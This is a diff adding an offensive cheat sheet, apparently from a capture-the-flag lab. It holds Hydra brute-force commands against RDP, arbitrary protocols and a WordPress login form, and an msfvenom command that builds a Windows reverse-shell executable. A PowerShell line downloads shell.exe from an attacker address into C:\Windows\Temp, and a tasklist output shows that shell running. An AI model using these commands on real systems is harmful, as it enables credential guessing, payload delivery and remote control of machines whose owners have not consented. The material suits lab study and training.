@@ -1,0 +1,66 @@
+hydra -P <wordlist> -v <ip> <protocol>
+	Brute force against a protocol of your choice
+	
+hydra -v -V -u -L <username list> -P <password list> -t 1 -u <ip> <protocol>
+	You can use Hydra to bruteforce usernames as well as passwords. It will loop through every combination in your lists. (-vV = verbose mode, showing login attempts)
+	
+hydra -t 1 -V -f -l <username> -P <wordlist> rdp://<ip>
+	Attack a Windows Remote Desktop with a password list.
+	
+hydra -l <username> -P .<password list> $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
+	Craft a more specific request for Hydra to brute force.
+	
+	
+sudo hydra <Username/List> <Password/List> <IP> <Method> "<Path>:<RequestBody>:<IncorrectVerbiage>"
+
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
+
+powershell -c "Invoke-WebRequest -Uri 'http://10.10.91.72:8080/shell.exe' -outFile 'C:\Windows\Temp\shell.exe'"
+
+System Idle Process              0 N/A                                         
+System                           4 N/A                                         
+smss.exe                       364 N/A                                         
+csrss.exe                      524 N/A                                         
+csrss.exe                      580 N/A                                         
+wininit.exe                    588 N/A                                         
+winlogon.exe                   616 N/A                                         
+services.exe                   672 N/A                                         
+lsass.exe                      680 SamSs                                       
+svchost.exe                    740 BrokerInfrastructure, DcomLaunch, LSM,      
+                                   PlugPlay, Power, SystemEventsBroker         
+svchost.exe                    784 RpcEptMapper, RpcSs                         
+dwm.exe                        872 N/A                                         
+svchost.exe                    880 Dhcp, EventLog, lmhosts, Wcmsvc             
+svchost.exe                    908 CertPropSvc, DsmSvc, gpsvc, iphlpsvc,       
+                                   LanmanServer, ProfSvc, Schedule, SENS,      
+                                   SessionEnv, ShellHWDetection, Themes,       
+                                   Winmgmt                                     
+svchost.exe                    964 EventSystem, FontCache, netprofm, nsi,      
+                                   W32Time, WinHttpAutoProxySvc                
+svchost.exe                     68 CryptSvc, Dnscache, LanmanWorkstation,      
+                                   NlaSvc, WinRM                               
+svchost.exe                    348 BFE, DPS, MpsSvc                            
+spoolsv.exe                   1144 Spooler                                     
+amazon-ssm-agent.exe          1184 AmazonSSMAgent                              
+svchost.exe                   1260 AppHostSvc                                  
+LiteAgent.exe                 1280 AWSLiteAgent                                
+svchost.exe                   1352 TrkWks, UALSVC, UmRdpService                
+svchost.exe                   1368 W3SVC, WAS                                  
+WService.exe                  1428 WindowsScheduler                            
+WScheduler.exe                1560 N/A                                         
+Ec2Config.exe                 1656 Ec2Config                                   
+WmiPrvSE.exe                  1800 N/A                                         
+svchost.exe                   1992 TermService                                 
+taskhostex.exe                2484 N/A                                         
+explorer.exe                  2584 N/A                                         
+ServerManager.exe             3000 N/A                                         
+WScheduler.exe                2372 N/A                                         
+msdtc.exe                     2336 MSDTC                                       
+w3wp.exe                       648 N/A                                         
+cmd.exe                       2988 N/A                                         
+conhost.exe                   1004 N/A                                         
+shell.exe                     1632 N/A                                         
+WmiPrvSE.exe                  2480 N/A                                         
+TrustedInstaller.exe          2656 TrustedInstaller                            
+TiWorker.exe                  1892 N/A                                         
+tasklist.exe                  1860 N/A       
